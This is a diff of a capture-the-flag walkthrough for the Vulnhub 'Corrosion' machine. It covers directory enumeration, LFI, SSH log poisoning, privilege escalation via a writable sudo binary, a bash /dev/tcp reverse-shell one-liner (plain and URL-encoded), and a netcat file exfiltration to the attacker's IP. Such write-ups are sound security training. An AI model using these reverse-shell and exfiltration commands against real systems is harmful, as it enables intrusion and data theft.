@@ -3,9 +3,11 @@
 Corrosion is an easy machine from Vulnhub by Proxy Programmer.
 
 Link to the machine: [https://www.vulnhub.com/entry/corrosion-1,730/](https://www.vulnhub.com/entry/corrosion-1,730/)
+<br />
+
 ## Identify The Target
 
-I am using this machine on host-only. 
+I'm using this machine on host-only. 
 ```
 fping -agq 10.10.10.0/24
 
@@ -13,6 +15,7 @@ fping -agq 10.10.10.0/24
 10.10.10.2
 10.10.10.10
 ```
+<br />
 
 ## Enumeration
 
@@ -32,13 +35,12 @@ PORT   STATE SERVICE VERSION
 MAC Address: 08:00:27:E5:F2:76 (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+<br />
 
 ## Enumerate the directories
 
-When navigates to webserver we got **apache default page**.
-
-Run gobuster
-
+When navigates to webserver we got `apache default page`.<br />
+Run `gobuster`
 ```
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -q -t 50 -u http://10.10.10.10 | tee go.log
 
@@ -46,18 +48,20 @@ http://10.10.10.10/tasks                (Status: 301) [Size: 310] [--> http://10
 http://10.10.10.10/blog-post            (Status: 301) [Size: 314] [--> http://10.10.10.10/blog-post/]    	    
 http://10.10.10.10/server-status        (Status: 403) [Size: 276]
 ```
-
-We have `/tasks` and `blog-post`,  Let's vist them.
+<br />
+We have `/tasks` and `/blog-post`,  Let's visit them.
 
 ![](pics/tasks.png)
+<br />
 
 ![](pics/task2.png)
+<br />
 
 We see ``change permission for auth log``. It gives us an idea that We need to do **SSH log poisoning**. For that, we need local file inclusion.
-
 So, Let's check `/blog-post`.
 
 ![](pics/blog.png)
+<br />
 
 Bruteforce directories.
 ```
@@ -66,100 +70,111 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-med
 http://10.10.10.10/blog-post/archives      (Status: 301) [Size: 323] [--> http://10.10.10.10/blog-post/archives/]
 http://10.10.10.10/blog-post/uploads       (Status: 301) [Size: 322] [--> http://10.10.10.10/blog-post/uploads/]
 ```
+<br />
+
 ![](pics/archives.png)
+<br />
 
-Archives directory had a php file named `randylogs.php`. But nothing in there.
-
-Fuzzing it for a LFI. and we found the parameter.
+The `archives` directory had a php file named `randylogs.php`. But nothing in there.<br />
+Fuzzing it for an LFI, and we found the parameter.
 
 ![](pics/fuzzing.png)
- 
+<br />
+
 Read the `/etc/passwd` file from the server.
 
 ![](pics/etc-passwd.png)
+<br />
 
 In `/tasks/tasks_todo.txt`, The hint said: `Change permissions for auth log`. That means the `auth log` file doesn’t have proper permissions. 
 So, we can read it.
 
 ![](pics/auth1.png)
+<br />
 
 ## Log poisoning
 
 > `auth.log` logs all the activity of SSH login attempts.
 
-> `Log Poisoning` is the attempts to **inject** malicious input to the server log.
+> `Log Poisoning` is the attempt to **inject** malicious input into the server log.
+<br />
 
-
-Since the file is PHP, if we inject PHP code, the server will execute it.
-
-We'r going to use ssh to inject a PHP code as user name, and that will take input from user and **execute commands**.
+Since the file is PHP, if we inject PHP code, the server will execute it.<br />
+We're going to use ssh to inject a PHP code as the username, and that will take input from the user and **execute commands**.
 
 ![](pics/php1.png)
+<br />
 
 Refresh `randylogs.php` page, and we injected our code.
 
 ![](pics/cmd1.png)
+<br />
 
 Executing commands: `http://10.10.10.10/blog-post/archives/randylogs.php?file=id`
 
 ![](pics/cmd2.png)
+<br />
 
-Let's get reverse shell: [https://www.revshells.com/](https://www.revshells.com/)
-
+Let's get a reverse shell: [https://www.revshells.com/](https://www.revshells.com/)<br />
 `nc -lnvp 5555`
-
+<br />
 `bash -c 'bash -i >& /dev/tcp/10.10.10.2/5555 0>&1'`
-
+<br />
 URL-encoded: `bash%20-c%20'bash%20-i%20%3E&%20/dev/tcp/10.10.10.2/5555%200%3E&1'%0A`
-
+<br />
 And we have a shell.
 
 ![](pics/shell)
+<br />
 
-After a while, i found `/var/backups/user_backup.zip` , Let's download it.
-
-open a netcat listener on the local machine: `nc -lnvp 5566 > user.zip`.
-
-On the target machine: `cat user_backup.zip > /dev/tcp/10.10.10.2/5566`.
-
-we have to crack the password of the file and extract the contents.
+After a while, I found `/var/backups/user_backup.zip` , Let's download it.<br />
+Open a netcat listener on the local machine: `nc -lnvp 5566 > user.zip`.<br />
+On the target machine: `cat user_backup.zip > /dev/tcp/10.10.10.2/5566`.<br />
+We have to crack the password of the file and extract the contents.
 
 ![](pics/crack.png)
+<br />
 
-We have the password of the user randy. Logged in as `randy`.
+We have the password of the user `randy`. Logged in as `randy`.
 
 ![](pics/randy.png)
+<br />
 
-We got the user.txt.
+We got the `user.txt`.
 
 ![](pics/user.png)
-
+<br />
 
 ## Privilege Escalation
  
-checking the sudo permissions
+Checking the sudo permissions
 
 ![](pics/sudo.png)
+<br />
 
-Here, we have got a binary that the user can run as sudo, with SUID bit ON, which means this binary will be running as root.
-
-But, root owns this file that disallows us to edit the file.
+Here, we have got a binary that the user can run as sudo, with SUID bit ON, which means this binary will be running as root.<br />
+But, root owns this file, that disallows us to edit the file.
 
 ![](pics/suid1.png)
+<br />
 
-user owns the directory which mean we can replace the content of the binary. Hence, we can use the **C** source file to write a code.
+The user owns the directory which means we can replace the content of the binary. Hence, we can use the **C** source file to write a code.
 
 ![](pics/c.png)
+<br />
 
 Let's modify the **C** file.
 
 ![](pics/nano2.png)
+<br />
 
 Compile it, and execute it. 
 ```
 gcc c.c -o easysysinfo
 sudo /home/randy/tools/easysysinfo
 ```
-We'r root. 
+<br />
+
+We're root. 
 
 ![](pics/root.png)
